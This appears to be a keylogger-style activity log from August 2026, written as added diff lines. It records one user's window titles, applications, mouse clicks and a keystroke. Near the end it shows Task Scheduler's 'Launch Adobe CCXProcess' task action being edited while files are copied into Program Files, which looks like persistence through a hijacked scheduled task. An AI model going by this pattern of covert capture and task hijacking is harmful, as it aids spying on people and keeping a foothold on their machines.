+--- WINDOW  2026/08/11 17:18:49  [uTorrent.exe] μTorrent 3.6  (build 47254) [32-bit]
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:18:55  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:05  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:07  [uTorrent.exe] μTorrent 3.6  (build 47254) [32-bit]
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:19:09  [uTorrent.exe] μTorrent
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:19:11  [uTorrent.exe] μTorrent 3.6  (build 47254) [32-bit]
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:12  [WhatsApp.Root.exe] WhatsApp
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:13  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:14  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:15  [Upwork.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:19:16  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:17  [ChatGPT Classic.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:19:19  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:20  [IDMan.exe] Internet Download Manager 6.42
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:19:21  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:22  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:23  [WhatsApp.Root.exe] H.NotifyIcon_9f301f18-2ae3-4de0-a5c1-cee6117b865f
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:19:24  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:30  [ms-teams.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:19:33  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:47  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:47  [ApplicationFrameHost.exe] Windows Security
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:47  [explorer.exe] Program Manager
+----------------------------------------------------------------------------
+  [RMB]
+  [LMB]
+  [LMB]
+  r
+
+--- WINDOW  2026/08/11 17:19:52  [explorer.exe] Run
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:19:54  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:54  [explorer.exe] Program Manager
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:19:56  [mmc.exe] Task Scheduler
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:20:37  [mmc.exe] Launch Adobe CCXProcess Properties (Local Computer)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:20:58  [mmc.exe] Edit Action
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:12  (no active window)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:21:12  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:12  [explorer.exe] File Explorer
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:21:20  [explorer.exe] This PC
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:21:21  [explorer.exe] Local Disk (C:)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:21:24  [explorer.exe] Program Files
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:21:26  [explorer.exe] Adobe
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:21:28  [explorer.exe] Program Files
+----------------------------------------------------------------------------
+  [RMB]
+  [LMB]
+
+--- WINDOW  2026/08/11 17:21:33  [explorer.exe] Progress
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:34  [explorer.exe] 15% complete
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:34  [explorer.exe] 25% complete
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:34  [explorer.exe] 71% complete
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:34  [explorer.exe] 96% complete
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:35  [explorer.exe] Program Files
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:42  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:42  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:21:43  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:43  [mmc.exe] Task Scheduler
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:57  [mmc.exe] Edit Action
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:21:57  [mmc.exe] Microsoft Management Console
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:22:02  [mmc.exe] Edit Action
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:22:03  [mmc.exe] Launch Adobe CCXProcess Properties (Local Computer)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:22:05  [mmc.exe] Task Scheduler
+----------------------------------------------------------------------------
+
+--- WINDOW  2026/08/11 17:22:08  [explorer.exe] Program Files
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026/08/11 17:22:10  [explorer.exe] Program Manager
+----------------------------------------------------------------------------
+  [RMB]
+  [LMB]
